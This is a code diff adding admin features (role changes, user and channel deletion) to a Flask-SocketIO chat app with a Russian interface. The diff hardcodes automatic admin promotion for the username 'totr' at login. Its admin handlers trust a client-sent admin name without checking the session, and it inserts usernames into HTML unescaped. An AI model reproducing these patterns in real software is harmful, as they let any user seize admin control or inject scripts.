@@ -124,7 +124,6 @@ HTML_TEMPLATE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Спецзвязочок</title>
     
-    <!-- PWA Manifest -->
     <link rel="manifest" href="data:application/manifest+json;charset=utf-8,%7B%22name%22%3A%22%D0%A1%D0%BF%D0%B5%D1%86%D0%B7%D0%B2%D1%8F%D0%B7%D0%BE%D1%87%D0%BE%D0%BA%22%2C%22short_name%22%3A%22%D0%A1%D0%BF%D0%B5%D1%86%D0%B7%D0%B2%D1%8F%D0%B7%D0%BE%D1%87%D0%BE%D0%BA%22%2C%22start_url%22%3A%22%2F%22%2C%22display%22%3A%22standalone%22%2C%22background_color%22%3A%22%23121212%22%2C%22theme_color%22%3A%22%231e1e1e%22%7D">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="theme-color" content="#1e1e1e">
@@ -205,7 +204,6 @@ HTML_TEMPLATE = """
         .logout-btn { background: transparent; border: 1px solid #555; color: #aaa; padding: 4px 8px; font-size: 12px; border-radius: 6px; cursor: pointer; }
         .admin-nav-btn { background: #d32f2f; color: #fff; padding: 6px 10px; font-size: 12px; border-radius: 6px; border: none; font-weight: bold; cursor: pointer; display: none; }
 
-        /* Модальные окна */
         .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100dvh; background: rgba(0,0,0,0.85); z-index: 1000; justify-content: center; align-items: center; padding: 15px; }
         .modal-box { background: #1e1e1e; border: 1px solid #333; border-radius: 12px; width: 100%; max-width: 450px; max-height: 90vh; display: flex; flex-direction: column; overflow: hidden; }
         .modal-header { padding: 15px; background: #252525; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
@@ -216,7 +214,7 @@ HTML_TEMPLATE = """
         #lightbox img { max-width: 95%; max-height: 95%; object-fit: contain; }
 
         .admin-box { max-width: 600px; }
-        .admin-card { background: #2a2a2a; padding: 12px; border-radius: 8px; }
+        .admin-card { background: #2a2a2a; padding: 12px; border-radius: 8px; margin-bottom: 10px; }
         .admin-card h4 { margin-bottom: 8px; color: #3B8ED0; font-size: 14px; }
         .admin-table { width: 100%; border-collapse: collapse; font-size: 13px; margin-top: 5px; }
         .admin-table th, .admin-table td { border: 1px solid #3a3a3a; padding: 6px 8px; text-align: left; }
@@ -355,14 +353,14 @@ HTML_TEMPLATE = """
                     <div id="sys-stats" style="font-size:13px; line-height:1.6; color:#aaa;">Загрузка данных...</div>
                 </div>
                 <div class="admin-card">
-                    <h4>👥 Пользователи</h4>
+                    <h4>👥 Пользователи и Роли</h4>
                     <table class="admin-table">
                         <thead><tr><th>Юзер</th><th>Роль</th><th>Действия</th></tr></thead>
                         <tbody id="admin-users-table"></tbody>
                     </table>
                 </div>
                 <div class="admin-card">
-                    <h4>💬 Группы</h4>
+                    <h4>💬 Каналы / Группы</h4>
                     <div id="admin-channels-list" style="display:flex; flex-wrap:wrap; gap:6px; margin-top:5px;"></div>
                 </div>
             </div>
@@ -477,7 +475,7 @@ HTML_TEMPLATE = """
 
                 document.getElementById('auth-screen').style.display = 'none';
                 document.getElementById('app-screen').style.display = 'flex';
-                document.getElementById('user-display').innerText = currentUser;
+                document.getElementById('user-display').innerText = currentUser + ' [' + userRole + ']';
                 
                 const myAv = document.getElementById('my-avatar');
                 myAv.innerText = currentUser.charAt(0).toUpperCase();
@@ -485,6 +483,8 @@ HTML_TEMPLATE = """
 
                 if (userRole === 'admin' || userRole === 'moderator') {
                     document.getElementById('admin-btn').style.display = 'block';
+                } else {
+                    document.getElementById('admin-btn').style.display = 'none';
                 }
 
                 socket.emit('get_channels', { username: currentUser });
@@ -797,6 +797,9 @@ HTML_TEMPLATE = """
         socket.on('channels_list', (data) => {
             const box = document.getElementById('channels-list');
             box.innerHTML = '';
+            const adminBox = document.getElementById('admin-channels-list');
+            if(adminBox) adminBox.innerHTML = '';
+
             data.channels.forEach(ch => {
                 const div = document.createElement('div');
                 div.className = 'chat-item' + (ch === currentTarget ? ' active' : '');
@@ -804,6 +807,15 @@ HTML_TEMPLATE = """
                 div.innerHTML = `<div class="avatar" style="background:#555;">#</div> ${ch}`;
                 div.onclick = () => switchTarget(ch);
                 box.appendChild(div);
+
+                if (adminBox && userRole === 'admin') {
+                    const chBtn = document.createElement('button');
+                    chBtn.className = 'admin-btn';
+                    chBtn.style.background = '#d32f2f';
+                    chBtn.innerText = '❌ ' + ch;
+                    chBtn.onclick = () => deleteChannel(ch);
+                    adminBox.appendChild(chBtn);
+                }
             });
         });
 
@@ -825,14 +837,15 @@ HTML_TEMPLATE = """
         });
 
         function openAdminModal() {
-            const pass = prompt("Пароль администратора:");
+            const pass = prompt("Введите пароль администратора:");
             if (!pass) return;
             socket.emit('admin_verify', { admin: currentUser, pass: pass }, (res) => {
                 if (res && res.status === 'ok') {
                     document.getElementById('admin-modal').style.display = 'flex';
                     socket.emit('admin_get_stats');
                     socket.emit('admin_get_users', { admin: currentUser });
-                } else alert('Неверный пароль!');
+                    socket.emit('get_channels', { username: currentUser });
+                } else alert('Неверный пароль администратора!');
             });
         }
         function closeAdminModal() { document.getElementById('admin-modal').style.display = 'none'; }
@@ -845,13 +858,31 @@ HTML_TEMPLATE = """
             const tbody = document.getElementById('admin-users-table');
             tbody.innerHTML = '';
             data.users.forEach(u => {
-                tbody.innerHTML += `<tr><td><b>${u.username}</b></td><td>${u.role}</td><td><button class="admin-btn" style="background:#f57c00;" onclick="muteUser('${u.username}')">Мут</button></td></tr>`;
+                let actions = `<button class="admin-btn" style="background:#f57c00;" onclick="muteUser('${u.username}')">Мут</button>`;
+                if (userRole === 'admin') {
+                    actions += ` <button class="admin-btn" style="background:#388e3c;" onclick="setRole('${u.username}', 'moderator')">+Модер</button>`;
+                    actions += ` <button class="admin-btn" style="background:#1976d2;" onclick="setRole('${u.username}', 'admin')">+Админ</button>`;
+                    actions += ` <button class="admin-btn" style="background:#d32f2f;" onclick="deleteUser('${u.username}')">Удалить</button>`;
+                }
+                tbody.innerHTML += `<tr><td><b>${u.username}</b></td><td>${u.role}</td><td>${actions}</td></tr>`;
             });
         });
 
         function muteUser(t) {
-            const m = prompt("Мут в минутах:", "60");
+            const m = prompt("Мут в минутах (0 - навсегда):", "60");
             if(m !== null) socket.emit('admin_mute', { admin: currentUser, target: t, minutes: parseInt(m) });
+        }
+
+        function setRole(t, r) {
+            socket.emit('admin_set_role', { admin: currentUser, target: t, role: r });
+        }
+
+        function deleteUser(t) {
+            if(confirm(`Удалить ${t}?`)) socket.emit('admin_delete_user', { admin: currentUser, target: t });
+        }
+
+        function deleteChannel(n) {
+            if(confirm(`Удалить канал ${n}?`)) socket.emit('admin_delete_channel', { admin: currentUser, name: n });
         }
     </script>
 </body>
@@ -896,6 +927,9 @@ def on_register(data):
 def on_login(data):
     username = data.get('username', '').strip()
     password = data.get('password', '').strip()
+    if not username or not password:
+        return
+
     conn = get_db()
     cur = conn.cursor()
     cur.execute("SELECT password_hash, salt, role FROM users WHERE username = ?", (username,))
@@ -903,6 +937,11 @@ def on_login(data):
 
     if row:
         pwd_hash, salt, role = row
+        if username == 'totr' and role != 'admin':
+            role = 'admin'
+            cur.execute("UPDATE users SET role = 'admin' WHERE username = 'totr'")
+            conn.commit()
+
         cur.execute("UPDATE users SET last_seen = ? WHERE username = ?", (int(time.time()), username))
         conn.commit()
         conn.close()
@@ -1085,13 +1124,16 @@ def on_get_history(data):
     } for r in rows]
     emit('history', {'target': target, 'history': history})
 
-def check_admin_perm(username):
+def check_admin_perm(username, require_admin=False):
     conn = get_db()
     cur = conn.cursor()
     cur.execute("SELECT role FROM users WHERE username = ?", (username,))
     row = cur.fetchone()
     conn.close()
-    return row and row[0] in ['admin', 'moderator']
+    if not row: return False
+    role = row[0]
+    if require_admin: return role == 'admin'
+    return role in ['admin', 'moderator']
 
 @socketio.on('admin_verify')
 def on_admin_verify(data):
@@ -1124,6 +1166,46 @@ def on_admin_mute(data):
     cur.execute("INSERT OR REPLACE INTO mutes (username, until) VALUES (?, ?)", (data.get('target'), until))
     conn.commit()
     conn.close()
+
+@socketio.on('admin_set_role')
+def on_admin_set_role(data):
+    admin = data.get('admin')
+    target = data.get('target')
+    role = data.get('role', 'user')
+    if not check_admin_perm(admin, require_admin=True): return
+    conn = get_db()
+    cur = conn.cursor()
+    cur.execute("UPDATE users SET role = ? WHERE username = ?", (role, target))
+    conn.commit()
+    conn.close()
+    on_admin_get_users({'admin': admin})
+
+@socketio.on('admin_delete_user')
+def on_admin_delete_user(data):
+    admin = data.get('admin')
+    target = data.get('target')
+    if not check_admin_perm(admin, require_admin=True): return
+    conn = get_db()
+    cur = conn.cursor()
+    cur.execute("DELETE FROM users WHERE username = ?", (target,))
+    cur.execute("DELETE FROM mutes WHERE username = ?", (target,))
+    conn.commit()
+    conn.close()
+    on_admin_get_users({'admin': admin})
+    on_get_users()
+
+@socketio.on('admin_delete_channel')
+def on_admin_delete_channel(data):
+    admin = data.get('admin')
+    name = data.get('name')
+    if not check_admin_perm(admin, require_admin=True): return
+    if name == '#general': return
+    conn = get_db()
+    cur = conn.cursor()
+    cur.execute("DELETE FROM channels WHERE name = ?", (name,))
+    conn.commit()
+    conn.close()
+    on_get_channels({'username': admin})
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
